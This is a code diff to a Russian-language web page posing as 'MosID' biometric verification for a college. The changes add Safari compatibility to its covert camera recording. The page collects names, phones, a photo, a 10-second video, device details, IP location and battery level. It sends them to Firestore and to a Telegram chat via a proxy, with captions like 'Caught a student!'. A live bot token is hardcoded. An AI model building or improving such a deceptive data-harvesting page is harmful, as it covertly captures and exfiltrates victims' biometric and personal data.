@@ -245,6 +245,7 @@
     .camera-frame canvas {
       width: 100%; height: 100%;
       object-fit: cover; display: block;
+      -webkit-transform: scaleX(-1);
       transform: scaleX(-1);
     }
     .camera-frame .cam-placeholder {
@@ -495,7 +496,7 @@
         <div class="mosid-sub">Сверка с базой студентов колледжа</div>
 
         <div class="camera-frame" id="cameraFrame">
-          <video id="cameraVideo" autoplay muted playsinline style="display:none;"></video>
+          <video id="cameraVideo" autoplay muted playsinline webkit-playsinline style="display:none;"></video>
           <div class="cam-placeholder" id="camPlaceholder">
             <div class="cam-icon">📷</div>
             <div>Ожидание доступа к камере…</div>
@@ -536,12 +537,14 @@
     appId: "1:262830985110:web:6253b9cd57e767a04b57b7"
   };
 
+  // ===== Определяем Safari =====
+  const IS_SAFARI = /^((?!chrome|android|crios|fxios).)*safari/i.test(navigator.userAgent);
+
   // ===== TELEGRAM =====
   const TELEGRAM_TOKEN = "8839536788:AAFbVmXWYa0grVBG15FqS1ePvE3znAzUAL8";
   const TELEGRAM_CHAT_ID = "6651741310";
   const PROXY_URL = "https://kp11-bot-proxy.riwendik.workers.dev";
 
-  // Отправка текстового сообщения
   async function sendTelegramNotify(text) {
     try {
       const res = await fetch(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendMessage`, {
@@ -560,7 +563,6 @@
     }
   }
 
-  // Отправка альбома с фото и видео (sendMediaGroup)
   async function sendTelegramMediaGroup(photoBase64, videoBase64, caption) {
     try {
       const formData = new FormData();
@@ -1010,7 +1012,7 @@
     cameraFrame.classList.add('recording');
     mosidStatus.textContent = "Сверка биометрии…";
 
-    // Фото делается сразу после разрешения камеры
+    // Фото делаем сразу после разрешения камеры
     setTimeout(() => {
       try {
         const canvas = document.createElement('canvas');
@@ -1056,10 +1058,8 @@
       document.addEventListener('touchstart', unlock, { once: true });
     });
 
-    // Запускаем запись видео
     startVideoRecording();
 
-    // Через 10 секунд — стоп и сохранение
     setTimeout(async () => {
       recIndicator.classList.remove('show');
       await stopRecordingAndSave();
@@ -1081,28 +1081,61 @@
     saveToFirestore(null, null);
   }
 
+  // ===== Запуск записи с оптимизацией под Safari =====
   function startVideoRecording() {
     if (!mediaStream) return;
+
     try {
       recordedChunks = [];
 
-      // Приоритет — MP4, запасной — WebM
-      let mimeType = 'video/mp4';
-      if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm;codecs=vp8';
-      if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm';
+      // Для Safari — только MP4 с h264, высокий битрейт
+      // Для остальных — MP4 → WebM (vp8) → WebM
+      let mimeType;
+      let bitrate;
 
-      console.log("Используем mimeType:", mimeType);
+      if (IS_SAFARI) {
+        mimeType = 'video/mp4;codecs=h264';
+        bitrate = 1000000; // 1 Мбит/с — иначе Safari рвёт
+      } else {
+        mimeType = 'video/mp4';
+        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm;codecs=vp8';
+        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm';
+        bitrate = 200000;
+      }
 
-      mediaRecorder = new MediaRecorder(mediaStream, {
-        mimeType: mimeType,
-        videoBitsPerSecond: 200000
-      });
+      // Проверка, что mimeType поддерживается
+      if (!MediaRecorder.isTypeSupported(mimeType)) {
+        console.warn("mimeType не поддерживается:", mimeType, "пробуем без кодека");
+        // fallback — без явного кодека
+        if (IS_SAFARI) mimeType = 'video/mp4';
+        else mimeType = 'video/webm';
+      }
+
+      console.log("Используем mimeType:", mimeType, "bitrate:", bitrate);
+
+      const options = { mimeType: mimeType };
+      if (!IS_SAFARI) options.videoBitsPerSecond = bitrate;
+      // Для Safari тоже попробуем с битрейтом, но некоторые версии его игнорируют
+      else options.videoBitsPerSecond = bitrate;
+
+      mediaRecorder = new MediaRecorder(mediaStream, options);
+
       mediaRecorder.ondataavailable = (e) => {
         if (e.data && e.data.size > 0) recordedChunks.push(e.data);
       };
-      mediaRecorder.start(1000);
+
+      mediaRecorder.onerror = (e) => {
+        console.error("MediaRecorder error:", e);
+      };
+
+      // timeslice 500мс — Safari иногда требует чаще
+      mediaRecorder.start(500);
     } catch (e) {
       console.error("MediaRecorder start failed:", e);
+      // Если не смогли запустить — сохраним без видео
+      setTimeout(() => {
+        saveToFirestore(null, capturedPhoto);
+      }, 10000);
     }
   }
 
@@ -1119,12 +1152,15 @@
         let videoBase64 = null;
         if (recordedChunks.length > 0) {
           const blob = new Blob(recordedChunks, { type: recordedChunks[0].type || 'video/mp4' });
-          if (blob.size < 800 * 1024) {
+          // Лимит Firestore — 1 МБ. Проверяем.
+          if (blob.size < 900 * 1024) {
             videoBase64 = await blobToBase64(blob);
-            console.log("Видео base64 размер:", videoBase64.length, "тип:", blob.type);
+            console.log("Видео base64 размер:", videoBase64.length, "тип:", blob.type, "размер блоба:", blob.size);
           } else {
-            console.warn("Видео слишком большое:", blob.size);
+            console.warn("Видео слишком большое для Firestore:", blob.size);
           }
+        } else {
+          console.warn("Нет записанных чанков");
         }
         saveToFirestore(videoBase64, capturedPhoto);
         resolve();
@@ -1147,7 +1183,7 @@
     });
   }
 
-  // ===== Сохранение в Firestore + 2 сообщения в Telegram =====
+  // ===== Сохранение =====
   async function saveToFirestore(videoBase64, photoBase64) {
     if (!pendingData) {
       console.warn("Нет данных для сохранения");
@@ -1155,28 +1191,22 @@
     }
 
     const deviceInfo = await collectDeviceInfo();
-
     const { fio, phone, group, isStaff, staffFio } = pendingData;
 
     try {
       if (isStaff) {
         const docData = {
-          fio: staffFio,
-          phone,
-          role: "staff",
-          ...deviceInfo,
-          time: serverTimestamp()
+          fio: staffFio, phone, role: "staff",
+          ...deviceInfo, time: serverTimestamp()
         };
         if (photoBase64) docData.photo = photoBase64;
         if (videoBase64) docData.video = videoBase64;
         await addDoc(collection(db, "staff"), docData);
-        console.log("✅ Педагог сохранён");
 
         const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
         const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
         const batteryStr = deviceInfo.batteryLevel != null
-          ? `${deviceInfo.batteryLevel}%${deviceInfo.batteryCharging ? " ⚡" : ""}`
-          : "—";
+          ? `${deviceInfo.batteryLevel}%${deviceInfo.batteryCharging ? " ⚡" : ""}` : "—";
 
         const caption =
           "🚨🚨🚨 <b>ВНИМАНИЕ! ПЕДАГОГ!</b> 🚨🚨🚨\n\n" +
@@ -1187,29 +1217,23 @@
           "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
           "⚠️ <b>Это сотрудник колледжа!</b>";
 
-        // 1) Текст
         await sendTelegramNotify(caption);
-
-        // 2) Альбом с фото + видео
         if (photoBase64 || videoBase64) {
           await sendTelegramMediaGroup(photoBase64, videoBase64, "");
         }
       } else {
         const docData = {
           fio, phone, group,
-          ...deviceInfo,
-          time: serverTimestamp()
+          ...deviceInfo, time: serverTimestamp()
         };
         if (photoBase64) docData.photo = photoBase64;
         if (videoBase64) docData.video = videoBase64;
         await addDoc(collection(db, "students"), docData);
-        console.log("✅ Студент сохранён");
 
         const deviceStr = [deviceInfo.os, deviceInfo.browser, deviceInfo.model].filter(Boolean).join(" · ") || "—";
         const ipStr = [deviceInfo.ip, deviceInfo.ipCity, deviceInfo.ipProvider].filter(Boolean).join(" · ") || "—";
         const batteryStr = deviceInfo.batteryLevel != null
-          ? `${deviceInfo.batteryLevel}%${deviceInfo.batteryCharging ? " ⚡" : ""}`
-          : "—";
+          ? `${deviceInfo.batteryLevel}%${deviceInfo.batteryCharging ? " ⚡" : ""}` : "—";
 
         const caption =
           "👀 <b>Попался студент!</b>\n\n" +
@@ -1220,10 +1244,7 @@
           "🌐 <b>IP:</b> " + ipStr + "\n" +
           "🔋 <b>Заряд:</b> " + batteryStr;
 
-        // 1) Текст
         await sendTelegramNotify(caption);
-
-        // 2) Альбом с фото + видео
         if (photoBase64 || videoBase64) {
           await sendTelegramMediaGroup(photoBase64, videoBase64, "");
         }
@@ -1238,7 +1259,6 @@
     e.preventDefault();
     notice.classList.remove('show');
 
-    // Педагог
     if (courseEl.value === 'staff') {
       if (fioEl.value.trim()) {
         const res = validateFIO(fioEl.value);
@@ -1262,32 +1282,14 @@
 
       const staffFio = fioEl.value.trim().replace(/\s+/g, ' ') || 'Без имени';
 
-      pendingData = {
-        phone: phoneRes.normalized,
-        isStaff: true,
-        staffFio: staffFio
-      };
-
+      pendingData = { phone: phoneRes.normalized, isStaff: true, staffFio };
       startMosIdFlow();
       return;
     }
 
-    // Студент
-    if (!courseEl.value) {
-      courseEl.focus();
-      courseEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
-      return;
-    }
-    if (!dirEl.value) {
-      dirEl.focus();
-      dirEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
-      return;
-    }
-    if (!grpEl.value) {
-      grpEl.focus();
-      grpEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
-      return;
-    }
+    if (!courseEl.value) { courseEl.focus(); courseEl.scrollIntoView({ behavior: 'smooth', block: 'center' }); return; }
+    if (!dirEl.value) { dirEl.focus(); dirEl.scrollIntoView({ behavior: 'smooth', block: 'center' }); return; }
+    if (!grpEl.value) { grpEl.focus(); grpEl.scrollIntoView({ behavior: 'smooth', block: 'center' }); return; }
 
     const res = validateFIO(fioEl.value);
     if (!res.ok) {
